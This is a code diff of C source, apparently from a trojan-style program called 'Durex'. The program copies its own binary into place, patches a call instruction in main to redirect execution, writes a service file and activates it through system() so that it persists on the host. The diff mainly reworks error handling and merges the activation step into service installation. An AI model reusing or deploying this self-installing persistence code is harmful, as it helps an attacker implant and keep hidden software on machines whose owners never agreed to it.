@@ -14,21 +14,19 @@
 #include <stdlib.h>
 /* mmap */
 #include <sys/mman.h>
+/* remove */
 #include <stdio.h>
-#include "main.h"
 /* Elf64 structures*/
 #include <elf.h>
 
-void serverLog(const char *message, ...);
+#include "main.h"
 
 static int		install_error(int fd)
 {
-	if (fd >= 0)
+	if (fd != -1)
 		close(fd);
 	remove(DUREX_BINARY_FILE);
 	remove(DUREX_SERVICE_FILE);
-	remove(DUREX_CONF_FILE);
-	remove(DUREX_INIT_FILE);
 	return 1;
 }
 
@@ -62,7 +60,7 @@ static int		modify_binary(void *data)
 	if (!mainoff || !durexoff)
 		return 1;
 	// Now we search for a 'call ...' opcode in the main to replace with another function
-	u_char		*ptr = (u_char *)(data + mainoff); // Begining of "main"
+	unsigned char		*ptr = (unsigned char *)(data + mainoff); // Begining of "main"
 	int			off = 6;				// opcode length of "callq [offset]" is "e8 00 00 00 00" = 5
 	// Compute offset from main to the last call found
 	while (*ptr++ != 0xc3)				// ret opcode (go to the end of main)
@@ -83,7 +81,7 @@ int			install_binary()
 
 	bin = open(DUREX_BINARY_FILE, O_CREAT | O_EXCL | O_WRONLY, 0755);
 	if (bin < 0)
-		return install_error(bin);
+		return install_error(-1);
 	if ((durex = open(e.prog, O_RDONLY)) == -1)
 		return install_error(bin);
 	size = lseek(durex, 1, SEEK_END);
@@ -91,8 +89,10 @@ int			install_binary()
 	close(durex);
 	if (size == -1 || data == MAP_FAILED)
 		return install_error(bin);
-	if (modify_binary(data))
+	if (modify_binary(data)) {
+		munmap(data, size);
 		return install_error(bin);
+	}
 	durex = write(bin, data, size);
 	close(bin);
 	munmap(data, size);
@@ -108,41 +108,13 @@ int			install_service()
 	
 	fd = open(DUREX_SERVICE_FILE, O_CREAT | O_TRUNC | O_WRONLY, 0644);
 	if (fd < 0)
-		return install_error(fd);
+		return install_error(-1);
 	ret = write(fd, DUREX_SERVICE_SCRIPT, sizeof(DUREX_SERVICE_SCRIPT));
 	close(fd);
 	if (ret != sizeof(DUREX_SERVICE_SCRIPT))
 		return install_error(-1);
-	return 0;
-}
-
-int			install_conf()
-{
-	int		fd;
-	size_t	ret;
-	
-	fd = open(DUREX_CONF_FILE, O_CREAT | O_TRUNC | O_WRONLY, 0644);
-	if (fd < 0)
-		return install_error(fd);
-	ret = write(fd, DUREX_CONF_SCRIPT, sizeof(DUREX_CONF_SCRIPT));
-	close(fd);
-	if (ret != sizeof(DUREX_CONF_SCRIPT))
+//	printf("ret:%d\n", system(DUREX_ACTIVATE));
+	if (system(DUREX_ACTIVATE))
 		return install_error(-1);
-	return 0;	
-}
-
-int			install_init()
-{
-	int		fd;
-	size_t	ret;
-	
-	fd = open(DUREX_INIT_FILE, O_CREAT | O_TRUNC | O_WRONLY, 0755);
-	if (fd < 0)
-		return install_error(-1);
-	ret = write(fd, DUREX_INIT_SCRIPT, sizeof(DUREX_INIT_SCRIPT));
-	close(fd);
-	if (ret != sizeof(DUREX_INIT_SCRIPT))
-		return install_error(-1);
-	system(DUREX_ACTIVATE);
 	return 0;
 }
